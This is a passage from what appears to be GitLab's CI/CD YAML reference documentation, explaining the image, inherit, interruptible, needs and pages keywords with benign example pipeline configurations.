image: ruby:3.0

rspec:
script: bundle exec rspec

rspec 2.7:
image: registry.example.com/my-group/my-project/ruby:2.7
script: bundle exec rspec
```

In this example, the `ruby:3.0` image is the default for all jobs in the pipeline.
The `rspec 2.7` job does not use the default, because it overrides the default with
a job-specific `image` section.

**Related topics**:

- [Run your CI/CD jobs in Docker containers](https://docs.gitlab.com/ci/docker/using_docker_images/).

#### `image:name` [Permalink](https://docs.gitlab.com/ci/yaml/\#imagename "Permalink")

The name of the Docker image that the job runs in. Similar to [`image`](https://docs.gitlab.com/ci/yaml/#image) used by itself.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**: The name of the image, including the registry path if needed, in one of these formats:

- `<image-name>` (Same as using `<image-name>` with the `latest` tag)
- `<image-name>:<tag>`
- `<image-name>@<digest>`

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `image:name`**:

YAML Copy to clipboard

```yaml
test-job:
image:
    name: "registry.example.com/my/image:latest"
script: echo "Hello world"
```

**Related topics**:

- [Run your CI/CD jobs in Docker containers](https://docs.gitlab.com/ci/docker/using_docker_images/).

#### `image:entrypoint` [Permalink](https://docs.gitlab.com/ci/yaml/\#imageentrypoint "Permalink")

Command or script to execute as the container’s entry point.

When the Docker container is created, the `entrypoint` is translated to the Docker `--entrypoint` option.
The syntax is similar to the [Dockerfile `ENTRYPOINT` directive](https://docs.docker.com/reference/dockerfile/#entrypoint),
where each shell token is a separate string in the array.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- A string.

**Example of `image:entrypoint`**:

YAML Copy to clipboard

```yaml
test-job:
image:
    name: super/sql:experimental
    entrypoint: [""]
script: echo "Hello world"
```

**Related topics**:

- [Override the entrypoint of an image](https://docs.gitlab.com/ci/docker/using_docker_images/#override-the-entrypoint-of-an-image).

#### `image:docker` [Permalink](https://docs.gitlab.com/ci/yaml/\#imagedocker "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/27919) in GitLab 16.7. Requires GitLab Runner 16.7 or later.
- `user` input option [introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/137907) in GitLab 16.8.

Use `image:docker` to pass options to the [Docker executor](https://docs.gitlab.com/runner/executors/docker.html) and the [Kubernetes executor](https://docs.gitlab.com/runner/executors/kubernetes/).
runner. This keyword does not work with other executor types.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

A hash of options for the Docker executor, which can include:

- `platform`: Selects the architecture of the image to pull. When not specified,
the default is the same platform as the host runner.
- `user`: Specify the username or UID to use when running the container.

**Example of `image:docker`**:

YAML Copy to clipboard

```yaml
arm-sql-job:
script: echo "Run sql tests"
image:
    name: super/sql:experimental
    docker:
      platform: arm64/v8
      user: dave
```

**Additional details**:

- `image:docker:platform` maps to the [`docker pull --platform` option](https://docs.docker.com/reference/cli/docker/image/pull/#options).
- `image:docker:user` maps to the [`docker run --user` option](https://docs.docker.com/reference/cli/docker/container/run/#options).

#### `image:kubernetes` [Permalink](https://docs.gitlab.com/ci/yaml/\#imagekubernetes "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/38451) in GitLab 18.0. Requires GitLab Runner 17.11 or later.
- `user` input option [introduced](https://gitlab.com/gitlab-org/gitlab-runner/-/merge_requests/5469) in GitLab Runner 17.11.
- `user` input option [extended to support `uid:gid` format](https://gitlab.com/gitlab-org/gitlab-runner/-/merge_requests/5540) in GitLab 18.0.

Use `image:kubernetes` to pass options to the GitLab Runner [Kubernetes executor](https://docs.gitlab.com/runner/executors/kubernetes/).
This keyword does not work with other executor types.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

A hash of options for the Kubernetes executor, which can include:

- `user`: Specify the username or UID to use when the container runs. You can also use it to set GID by using the `UID:GID` format.

**Example of `image:kubernetes` with only UID**:

YAML Copy to clipboard

```yaml
arm-sql-job:
script: echo "Run sql tests"
image:
    name: super/sql:experimental
    kubernetes:
      user: "1001"
```

**Example of `image:kubernetes` with both UID and GID**:

YAML Copy to clipboard

```yaml
arm-sql-job:
script: echo "Run sql tests"
image:
    name: super/sql:experimental
    kubernetes:
      user: "1001:1001"
```

#### `image:pull_policy` [Permalink](https://docs.gitlab.com/ci/yaml/\#imagepull_policy "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/21619) in GitLab 15.1 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_docker_image_pull_policy`. Disabled by default.
- [Enabled on GitLab.com and GitLab Self-Managed](https://gitlab.com/gitlab-org/gitlab/-/issues/363186) in GitLab 15.2.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/363186) in GitLab 15.4. [Feature flag `ci_docker_image_pull_policy`](https://gitlab.com/gitlab-org/gitlab/-/issues/363186) removed.
- Requires GitLab Runner 15.1 or later.

The pull policy that the runner uses to fetch the Docker image.

**Keyword type**: Job keyword. You can use it only as part of a job or in the [`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- A single pull policy, or multiple pull policies in an array.
Can be `always`, `if-not-present`, or `never`.

**Examples of `image:pull_policy`**:

YAML Copy to clipboard

```yaml
job1:
script: echo "A single pull policy."
image:
    name: ruby:3.0
    pull_policy: if-not-present

job2:
script: echo "Multiple pull policies."
image:
    name: ruby:3.0
    pull_policy: [always, if-not-present]
```

**Additional details**:

- If the runner does not support the defined pull policy, the job fails with an error similar to:
`ERROR: Job failed (system failure): the configured PullPolicies ([always]) are not allowed by AllowedPullPolicies ([never])`.

**Related topics**:

- [Run your CI/CD jobs in Docker containers](https://docs.gitlab.com/ci/docker/using_docker_images/).
- [Configure how runners pull images](https://docs.gitlab.com/runner/executors/docker.html#configure-how-runners-pull-images).
- [Set multiple pull policies](https://docs.gitlab.com/runner/executors/docker.html#set-multiple-pull-policies).

### `inherit` [Permalink](https://docs.gitlab.com/ci/yaml/\#inherit "Permalink")

Use `inherit` to [control inheritance of default keywords and variables](https://docs.gitlab.com/ci/jobs/#control-the-inheritance-of-default-keywords-and-variables).

#### `inherit:default` [Permalink](https://docs.gitlab.com/ci/yaml/\#inheritdefault "Permalink")

Use `inherit:default` to control the inheritance of [default keywords](https://docs.gitlab.com/ci/yaml/#default).

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `true` (default) or `false` to enable or disable the inheritance of all default keywords.
- A list of specific default keywords to inherit.

**Example of `inherit:default`**:

YAML Copy to clipboard

```yaml
default:
retry: 2
image: ruby:3.0
interruptible: true

job1:
script: echo "This job does not inherit any default keywords."
inherit:
    default: false

job2:
script: echo "This job inherits only the two listed default keywords. It does not inherit 'interruptible'."
inherit:
    default:
      - retry
      - image
```

**Additional details**:

- You can also list default keywords to inherit on one line: `default: [keyword1, keyword2]`

#### `inherit:variables` [Permalink](https://docs.gitlab.com/ci/yaml/\#inheritvariables "Permalink")

Use `inherit:variables` to control the inheritance of [default variables](https://docs.gitlab.com/ci/yaml/#default-variables) keywords.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `true` (default) or `false` to enable or disable the inheritance of all default variables.
- A list of specific variables to inherit.

**Example of `inherit:variables`**:

YAML Copy to clipboard

```yaml
variables:
VARIABLE1: "This is default variable 1"
VARIABLE2: "This is default variable 2"
VARIABLE3: "This is default variable 3"

job1:
script: echo "This job does not inherit any default variables."
inherit:
    variables: false

job2:
script: echo "This job inherits only the two listed default variables. It does not inherit 'VARIABLE3'."
inherit:
    variables:
      - VARIABLE1
      - VARIABLE2
```

**Additional details**:

- You can also list default variables to inherit on one line: `variables: [VARIABLE1, VARIABLE2]`

### `interruptible` [Permalink](https://docs.gitlab.com/ci/yaml/\#interruptible "Permalink")

History

- Support for `trigger` jobs [introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/138508) in GitLab 16.8.

Use `interruptible` to configure the [auto-cancel redundant pipelines](https://docs.gitlab.com/ci/pipelines/settings/#auto-cancel-redundant-pipelines)
feature to cancel a job before it completes if a new pipeline on the same ref starts for a newer commit. If the feature
is disabled, the keyword has no effect. The new pipeline must be for a commit with new changes. For example,
the **Auto-cancel redundant pipelines** feature has no effect
if you select **New pipeline** in the UI to run a pipeline for the same commit.

The behavior of the **Auto-cancel redundant pipelines** feature can be controlled by
the [`workflow:auto_cancel:on_new_commit`](https://docs.gitlab.com/ci/yaml/#workflowauto_cancelon_new_commit) setting.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- `true` or `false` (default).

**Example of `interruptible` with the default behavior**:

YAML Copy to clipboard

```yaml
workflow:
auto_cancel:
    on_new_commit: conservative # the default behavior

stages:
  - stage1
  - stage2
  - stage3

step-1:
stage: stage1
script:
    - echo "Can be canceled."
interruptible: true

step-2:
stage: stage2
script:
    - echo "Can not be canceled."

step-3:
stage: stage3
script:
    - echo "Because step-2 can not be canceled, this step can never be canceled, even though it's set as interruptible."
interruptible: true
```

In this example, a new pipeline causes a running pipeline to be:

- Canceled, if only `step-1` is running or pending.
- Not canceled, after `step-2` starts.

**Example of `interruptible` with the `auto_cancel:on_new_commit:interruptible` setting**:

YAML Copy to clipboard

```yaml
workflow:
auto_cancel:
    on_new_commit: interruptible

stages:
  - stage1
  - stage2
  - stage3

step-1:
stage: stage1
script:
    - echo "Can be canceled."
interruptible: true

step-2:
stage: stage2
script:
    - echo "Can not be canceled."

step-3:
stage: stage3
script:
    - echo "Can be canceled."
interruptible: true
```

In this example, a new pipeline causes a running pipeline to cancel `step-1` and `step-3` if they are running or pending.

**Additional details**:

- Only set `interruptible: true` if the job can be safely canceled after it has started,
like a build job. Deployment jobs usually shouldn’t be canceled, to prevent partial deployments.
- When using the default behavior or `workflow:auto_cancel:on_new_commit: conservative`:
  - A job that has not started yet is always considered `interruptible: true`, regardless of the job’s configuration.
    The `interruptible` configuration is only considered after the job starts.
  - **Running** pipelines are only canceled if all running jobs are configured with `interruptible: true` or
    no jobs configured with `interruptible: false` have started at any time.
    After a job with `interruptible: false` starts, the entire pipeline is no longer
    considered interruptible.
  - If the pipeline triggered a downstream pipeline, but no job with `interruptible: false`
    in the downstream pipeline has started yet, the downstream pipeline is also canceled.
- You can add an optional manual job with `interruptible: false` in the first stage of
a pipeline to allow users to manually prevent a pipeline from being automatically
canceled. After a user starts the job, the pipeline cannot be canceled by the
**Auto-cancel redundant pipelines** feature.
- When using `interruptible` with a [trigger job](https://docs.gitlab.com/ci/yaml/#trigger):
  - The triggered downstream pipeline is never affected by the trigger job’s `interruptible` configuration.
  - If [`workflow:auto_cancel`](https://docs.gitlab.com/ci/yaml/#workflowauto_cancelon_new_commit) is set to `conservative`,
    the trigger job’s `interruptible` configuration has no effect.
  - If [`workflow:auto_cancel`](https://docs.gitlab.com/ci/yaml/#workflowauto_cancelon_new_commit) is set to `interruptible`,
    a trigger job with `interruptible: true` can be automatically canceled.

### `needs` [Permalink](https://docs.gitlab.com/ci/yaml/\#needs "Permalink")

Use `needs` to execute jobs out-of-order. Relationships between jobs
that use `needs` can be visualized as a [directed acyclic graph](https://docs.gitlab.com/ci/yaml/needs/).

You can ignore stage ordering and run some jobs without waiting for others to complete.
Jobs in multiple stages can run concurrently.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- An array of jobs (maximum of 50 jobs).
- An empty array ( `[]`), to set the job to start as soon as the pipeline is created.

**Example of `needs`**:

YAML Copy to clipboard

```yaml
linux:build:
stage: build
script: echo "Building linux..."

mac:build:
stage: build
script: echo "Building mac..."

lint:
stage: test
needs: []
script: echo "Linting..."

linux:rspec:
stage: test
needs: ["linux:build"]
script: echo "Running rspec on linux..."

mac:rspec:
stage: test
needs: ["mac:build"]
script: echo "Running rspec on mac..."

production:
stage: deploy
script: echo "Running production..."
environment: production
```

This example creates four paths of execution:

- Linter: The `lint` job runs immediately without waiting for the `build` stage
to complete because it has no needs ( `needs: []`).
- Linux path: The `linux:rspec` job runs as soon as the `linux:build`
job finishes, without waiting for `mac:build` to finish.
- macOS path: The `mac:rspec` jobs runs as soon as the `mac:build`
job finishes, without waiting for `linux:build` to finish.
- The `production` job runs as soon as all previous jobs finish:
`lint`, `linux:build`, `linux:rspec`, `mac:build`, `mac:rspec`.

**Additional details**:

- The maximum number of jobs that a single job can have in the `needs` array is limited:
  - For GitLab.com, the limit is 50. For more information, see
    [issue 350398](https://gitlab.com/gitlab-org/gitlab/-/issues/350398).
  - For GitLab Self-Managed, the default limit is 50. This limit [can be changed](https://docs.gitlab.com/administration/cicd/#set-the-needs-job-limit).
- If `needs` refers to a job that uses the [`parallel`](https://docs.gitlab.com/ci/yaml/#parallel) keyword,
it depends on all jobs created in parallel, not just one job. It also downloads
artifacts from all the parallel jobs by default. If the artifacts have the same
name, they overwrite each other and only the last one downloaded is saved.
  - To have `needs` refer to a subset of parallelized jobs (and not all of the parallelized jobs),
    use the [`needs:parallel:matrix`](https://docs.gitlab.com/ci/yaml/#needsparallelmatrix) keyword.
- You can refer to jobs in the same stage as the job you are configuring.
- If `needs` refers to a job that might not be added to
a pipeline because of `only`, `except`, or `rules`, the pipeline might fail to create. Use the [`needs:optional`](https://docs.gitlab.com/ci/yaml/#needsoptional) keyword to resolve a failed pipeline creation.
- If a pipeline has jobs with `needs: []` and jobs in the [`.pre`](https://docs.gitlab.com/ci/yaml/#stage-pre) stage, they will
all start as soon as the pipeline is created. Jobs with `needs: []` start immediately,
and jobs in the `.pre` stage also start immediately.

#### `needs:artifacts` [Permalink](https://docs.gitlab.com/ci/yaml/\#needsartifacts "Permalink")

When a job uses `needs`, it no longer downloads all artifacts from previous stages
by default, because jobs with `needs` can start before earlier stages complete. With
`needs` you can only download artifacts from the jobs listed in the `needs` configuration.

Use `artifacts: true` (default) or `artifacts: false` to control when artifacts are
downloaded in jobs that use `needs`.

**Keyword type**: Job keyword. You can use it only as part of a job. Must be used with `needs:job`.

**Supported values**:

- `true` (default) or `false`.

**Example of `needs:artifacts`**:

YAML Copy to clipboard

```yaml
test-job1:
stage: test
needs:
    - job: build_job1
      artifacts: true

test-job2:
stage: test
needs:
    - job: build_job2
      artifacts: false

test-job3:
needs:
    - job: build_job1
      artifacts: true
    - job: build_job2
    - build_job3
```

In this example:

- The `test-job1` job downloads the `build_job1` artifacts
- The `test-job2` job does not download the `build_job2` artifacts.
- The `test-job3` job downloads the artifacts from all three `build_jobs`, because
`artifacts` is `true`, or defaults to `true`, for all three needed jobs.

**Additional details**:

- You should not combine `needs` with [`dependencies`](https://docs.gitlab.com/ci/yaml/#dependencies) in the same job.

#### `needs:project` [Permalink](https://docs.gitlab.com/ci/yaml/\#needsproject "Permalink")

- Tier: Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

Use `needs:project` to download artifacts from up to five jobs in other pipelines.
The artifacts are downloaded from the latest successful specified job for the specified ref.
To specify multiple jobs, add each as separate array items under the `needs` keyword.

If there is a pipeline running for the ref, a job with `needs:project`
does not wait for the pipeline to complete. Instead, the artifacts are downloaded
from the latest successful run of the specified job.

`needs:project` must be used with `job`, `ref`, and `artifacts`.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `needs:project`: A full project path, including namespace and group.
- `job`: The job to download artifacts from.
- `ref`: The ref to download artifacts from.
- `artifacts`: Must be `true` to download artifacts.

**Examples of `needs:project`**:

YAML Copy to clipboard

```yaml
build_job:
stage: build
script:
    - ls -lhR
needs:
    - project: namespace/group/project-name
      job: build-1
      ref: main
      artifacts: true
    - project: namespace/group/project-name-2
      job: build-2
      ref: main
      artifacts: true
```

In this example, `build_job` downloads the artifacts from the latest successful `build-1` and `build-2` jobs
on the `main` branches in the `group/project-name` and `group/project-name-2` projects.

You can use [CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file) in `needs:project`, for example:

YAML Copy to clipboard

```yaml
build_job:
stage: build
script:
    - ls -lhR
needs:
    - project: $CI_PROJECT_PATH
      job: $DEPENDENCY_JOB_NAME
      ref: $ARTIFACTS_DOWNLOAD_REF
      artifacts: true
```

**Additional details**:

- To download artifacts from a different pipeline in the current project, set `project`
to be the same as the current project, but use a different ref than the current pipeline.
Concurrent pipelines running on the same ref could override the artifacts.
- The user running the pipeline must have at least the Reporter role for the group or project,
or the group/project must have public visibility.
- You can’t use `needs:project` in the same job as [`trigger`](https://docs.gitlab.com/ci/yaml/#trigger).
- When using `needs:project` to download artifacts from another pipeline, the job does not wait for
the needed job to complete. [Using `needs` to wait for jobs to complete](https://docs.gitlab.com/ci/yaml/needs/)
is limited to jobs in the same pipeline. Make sure that the needed job in the other
pipeline completes before the job that needs it tries to download the artifacts.
- You can’t download artifacts from jobs that run in [`parallel`](https://docs.gitlab.com/ci/yaml/#parallel).
- Support [CI/CD variables](https://docs.gitlab.com/ci/variables/) in `project`, `job`, and `ref`.

**Related topics**:

- To download artifacts between [parent-child pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#parent-child-pipelines),
use [`needs:pipeline:job`](https://docs.gitlab.com/ci/yaml/#needspipelinejob).

#### `needs:pipeline:job` [Permalink](https://docs.gitlab.com/ci/yaml/\#needspipelinejob "Permalink")

A [child pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#parent-child-pipelines) can download artifacts from a
successfully finished job in its parent pipeline or another child pipeline in the same parent-child pipeline hierarchy.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `needs:pipeline`: A pipeline ID. Must be a pipeline present in the same parent-child pipeline hierarchy.
- `job`: The job to download artifacts from.

**Example of `needs:pipeline:job`**:

- Parent pipeline ( `.gitlab-ci.yml`):



YAML Copy to clipboard





```yaml
stages:
  - build
  - test

create-artifact:
stage: build
script: echo "sample artifact" > artifact.txt
artifacts:
    paths: [artifact.txt]

child-pipeline:
stage: test
trigger:
    include: child.yml
    strategy: depend
variables:
    PARENT_PIPELINE_ID: $CI_PIPELINE_ID
```

- Child pipeline ( `child.yml`):



YAML Copy to clipboard





```yaml
use-artifact:
    script: cat artifact.txt
    needs:
    - pipeline: $PARENT_PIPELINE_ID
      job: create-artifact
```

In this example, the `create-artifact` job in the parent pipeline creates some artifacts.
The `child-pipeline` job triggers a child pipeline, and passes the `CI_PIPELINE_ID`
variable to the child pipeline as a new `PARENT_PIPELINE_ID` variable. The child pipeline
can use that variable in `needs:pipeline` to download artifacts from the parent pipeline.
Having the `create-artifact` and `child-pipeline` jobs in subsequent stages ensures that
the `use-artifact` job only executes when `create-artifact` has successfully finished.

**Additional details**:

- The `pipeline` attribute does not accept the current pipeline ID ( `$CI_PIPELINE_ID`).
To download artifacts from a job in the current pipeline, use [`needs:artifacts`](https://docs.gitlab.com/ci/yaml/#needsartifacts).
- You cannot use `needs:pipeline:job` in a [trigger job](https://docs.gitlab.com/ci/yaml/#trigger), or to fetch artifacts
from a [multi-project pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#multi-project-pipelines).
To fetch artifacts from a multi-project pipeline use [`needs:project`](https://docs.gitlab.com/ci/yaml/#needsproject).
- The job listed in `needs:pipeline:job` must complete with a status of `success`
or the artifacts can’t be fetched. [Issue 367229](https://gitlab.com/gitlab-org/gitlab/-/issues/367229)
proposes to allow fetching artifacts from any job with artifacts.

#### `needs:optional` [Permalink](https://docs.gitlab.com/ci/yaml/\#needsoptional "Permalink")

To need a job that sometimes does not exist in the pipeline, add `optional: true`
to the `needs` configuration. If not defined, `optional: false` is the default.

Jobs that use [`rules`](https://docs.gitlab.com/ci/yaml/#rules), [`only`, or `except`](https://docs.gitlab.com/ci/yaml/deprecated_keywords/#only--except) and that are added with [`include`](https://docs.gitlab.com/ci/yaml/#include)
might not always be added to a pipeline. GitLab checks the `needs` relationships before starting a pipeline:

- If the `needs` entry has `optional: true` and the needed job is present in the pipeline,
the job waits for it to complete before starting.
- If the needed job is not present, the job can start when all other needs requirements are met.
- If the `needs` section contains only optional jobs, and none are added to the pipeline,
the job starts immediately (the same as an empty `needs` entry: `needs: []`).
- If a needed job has `optional: false`, but it was not added to the pipeline, the
pipeline fails to start with an error similar to: `'job1' job needs 'job2' job, but it was not added to the pipeline`.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Example of `needs:optional`**:

YAML Copy to clipboard

```yaml
build-job:
stage: build

test-job1:
stage: test

test-job2:
stage: test
rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

deploy-job:
stage: deploy
needs:
    - job: test-job2
      optional: true
    - job: test-job1
environment: production

review-job:
stage: deploy
needs:
    - job: test-job2
      optional: true
environment: review
```

In this example:

- `build-job`, `test-job1`, and `test-job2` start in stage order.
- When the branch is the default branch, `test-job2` is added to the pipeline, so:
  - `deploy-job` waits for both `test-job1` and `test-job2` to complete.
  - `review-job` waits for `test-job2` to complete.
- When the branch is not the default branch, `test-job2` is not added to the pipeline, so:
  - `deploy-job` waits for only `test-job1` to complete, and does not wait for the missing `test-job2`.
  - `review-job` has no other needed jobs and starts immediately (at the same time as `build-job`),
    like `needs: []`.

#### `needs:pipeline` [Permalink](https://docs.gitlab.com/ci/yaml/\#needspipeline "Permalink")

You can mirror the pipeline status from an upstream pipeline to a job by
using the `needs:pipeline` keyword. The latest pipeline status from the default branch is
replicated to the job.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- A full project path, including namespace and group. If the
project is in the same group or namespace, you can omit them from the `project`
keyword. For example: `project: group/project-name` or `project: project-name`.

**Example of `needs:pipeline`**:

YAML Copy to clipboard

```yaml
upstream_status:
stage: test
needs:
    pipeline: other/project
```

**Additional details**:

- If you add the `job` keyword to `needs:pipeline`, the job no longer mirrors the
pipeline status. The behavior changes to [`needs:pipeline:job`](https://docs.gitlab.com/ci/yaml/#needspipelinejob).

#### `needs:parallel:matrix` [Permalink](https://docs.gitlab.com/ci/yaml/\#needsparallelmatrix "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/254821) in GitLab 16.3.

Jobs can use [`parallel:matrix`](https://docs.gitlab.com/ci/yaml/#parallelmatrix) to run a job multiple times in parallel in a single pipeline,
but with different variable values for each instance of the job.

Use `needs:parallel:matrix` to execute jobs out-of-order depending on parallelized jobs.

**Keyword type**: Job keyword. You can use it only as part of a job. Must be used with `needs:job`.

**Supported values**: An array of hashes of variables:

- The variables and values must be selected from the variables and values defined in the `parallel:matrix` job.

**Example of `needs:parallel:matrix`**:

YAML Copy to clipboard

```yaml
linux:build:
stage: build
script: echo "Building linux..."
parallel:
    matrix:
      - PROVIDER: aws
        STACK:
          - monitoring
          - app1
          - app2

linux:rspec:
stage: test
needs:
    - job: linux:build
      parallel:
        matrix:
          - PROVIDER: aws
            STACK: app1
script: echo "Running rspec on linux..."
```

The previous example generates the following jobs:

Copy to clipboard

```plaintext
linux:build: [aws, monitoring]
linux:build: [aws, app1]
linux:build: [aws, app2]
linux:rspec
```

The `linux:rspec` job runs as soon as the `linux:build: [aws, app1]` job finishes.

**Related topics**:

- [Specify a parallelized job using needs with multiple parallelized jobs](https://docs.gitlab.com/ci/jobs/job_control/#specify-a-parallelized-job-using-needs-with-multiple-parallelized-jobs).

**Additional details**:

- The order of the matrix variables in `needs:parallel:matrix` must match the order
of the matrix variables in the needed job. For example, reversing the order of
the variables in the `linux:rspec` job in the previous example would be invalid:



YAML Copy to clipboard





```yaml
linux:rspec:
    stage: test
    needs:
    - job: linux:build
      parallel:
        matrix:
          - STACK: app1        # The variable order does not match `linux:build` and is invalid.
            PROVIDER: aws
script: echo "Running rspec on linux..."
```

### `pages` [Permalink](https://docs.gitlab.com/ci/yaml/\#pages "Permalink")

Use `pages` to define a [GitLab Pages](https://docs.gitlab.com/user/project/pages/) job that
uploads static content to GitLab. The content is then published as a website.

You must:

- Define `pages: true` to publish a directory named `public`
- Alternatively, define [`pages.publish`](https://docs.gitlab.com/ci/yaml/#pagespublish) if want to use a different content directory.
- Have a non-empty `index.html` file in the root of the content directory.

**Keyword type**: Job keyword or Job name (deprecated). You can use it only as part of a job.

**Supported Values**:

- A boolean. Uses the default configuration when set to `true`
- A hash of configuration options, see the following sections for details.

**Example of `pages`**:

YAML Copy to clipboard

```yaml
create-pages:
stage: deploy
script:
    - mv my-html-content public
pages: true  # specifies that this is a Pages job and publishes the default public directory
rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
environment: production
```

This example renames the `my-html-content/` directory to `public/`.
This directory is exported as an artifact and published with GitLab Pages.

**Example using a configuration hash**:

YAML Copy to clipboard

```yaml
create-pages:
stage: deploy
script:
    - echo "nothing to do here"
pages:  # specifies that this is a Pages job and publishes the default public directory
    publish: my-html-content
    expire_in: "1 week"
rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
environment: production
```

This example does not move the directory, but uses the `publish` property directly.
It also configures the pages deployment to be unpublished after a week.

**Additional details**:

- Using `pages` as a job name [is deprecated](https://docs.gitlab.com/ci/yaml/deprecated_keywords/#publish-keyword-and-pages-job-name-for-gitlab-pages).
- To use `pages` as a job name without triggering a Pages deployment, set the `pages` property to false

#### `pages.publish` [Permalink](https://docs.gitlab.com/ci/yaml/\#pagespublish "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/415821) in GitLab 16.1.
- [Changed](https://gitlab.com/gitlab-org/gitlab/-/issues/500000) to allow variables when passed to `publish` property in GitLab 17.9.
- [Moved](https://gitlab.com/gitlab-org/gitlab/-/issues/428018) the `publish` property under the `pages` keyword in GitLab 17.9.
- [Appended](https://gitlab.com/gitlab-org/gitlab/-/issues/428018) the `pages.publish` path automatically to `artifacts:paths` in GitLab 17.10.

Use `pages.publish` to configure the content directory of a [`pages` job](https://docs.gitlab.com/ci/yaml/#pages).

**Keyword type**: Job keyword. You can use it only as part of a `pages` job.

**Supported values**: A path to a directory containing the Pages content.
In [GitLab 17.10 and later](https://gitlab.com/gitlab-org/gitlab/-/issues/428018),
if not specified, the default `public` directory is used and if specified,
this path is automatically appended to [`artifacts:paths`](https://docs.gitlab.com/ci/yaml/#artifactspaths).

**Example of `pages.publish`**:

YAML Copy to clipboard

```yaml
create-pages:
stage: deploy
script:
    - npx @11ty/eleventy --input=path/to/eleventy/root --output=dist
pages:
    publish: dist  # this path is automatically appended to artifacts:paths
rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
environment: production
```

This example uses [Eleventy](https://www.11ty.dev/) to generate a static website and
output the generated HTML files into a the `dist/` directory. This directory is exported
as an artifact and published with GitLab Pages.

It is also possible to use variables in the `pages.publish` field. For example:

YAML Copy to clipboard

```yaml
create-pages:
stage: deploy
script:
    - mkdir -p $CUSTOM_FOLDER/$CUSTOM_PATH
    - cp -r public $CUSTOM_FOLDER/$CUSTOM_SUBFOLDER
pages:
    publish: $CUSTOM_FOLDER/$CUSTOM_SUBFOLDER  # this path is automatically appended to artifacts:paths
rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
variables:
    CUSTOM_FOLDER: "custom_folder"
    CUSTOM_SUBFOLDER: "custom_subfolder"
```

The publish path specified must be relative to the build root.

**Additional details**:

- The top-level `publish` keyword [is deprecated](https://docs.gitlab.com/ci/yaml/deprecated_keywords/#publish-keyword-and-pages-job-name-for-gitlab-pages) and must now be nested under the `pages` keyword

#### `pages.path_prefix` [Permalink](https://docs.gitlab.com/ci/yaml/\#pagespath_prefix "Permalink")

- Tier: Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated
- Status: Beta

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/129534) in GitLab 16.7 as an [experiment](https://docs.gitlab.com/policy/development_stages_support/) [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `pages_multiple_versions_setting`, disabled by default.
- [Enabled on GitLab.com, GitLab Self-Managed, and GitLab Dedicated](https://gitlab.com/gitlab-org/gitlab/-/issues/422145) in GitLab 17.4.
- [Changed](https://gitlab.com/gitlab-org/gitlab/-/issues/507423) to allow periods in GitLab 17.8.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/487161) in GitLab 17.9. Feature flag `pages_multiple_versions_setting` removed.

Use `pages.path_prefix` to configure a path prefix for [parallel deployments](https://docs.gitlab.com/user/project/pages/#parallel-deployments) of GitLab Pages.

**Keyword type**: Job keyword. You can use it only as part of a `pages` job.

**Supported values**:

- A string
- [CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file)
- A combination of both

The given value is converted to lowercase and shortened to 63 bytes.
Everything except alphanumeric characters or periods is replaced with a hyphen.
Leading and trailing hyphens or periods are not permitted.

**Example of `pages.path_prefix`**:

YAML Copy to clipboard

```yaml
create-pages:
stage: deploy
script:
    - echo "Pages accessible through ${CI_PAGES_URL}/${CI_COMMIT_BRANCH}"
pages:  # specifies that this is a Pages job and publishes the default public directory
    path_prefix: "$CI_COMMIT_BRANCH"
```

In this example, a different pages deployment is created for each branch.

#### `pages.expire_in` [Permalink](https://docs.gitlab.com/ci/yaml/\#pagesexpire_in "Permalink")

- Tier: Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/456478) in GitLab 17.4.
- Support for variables [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/492289) in GitLab 17.11.

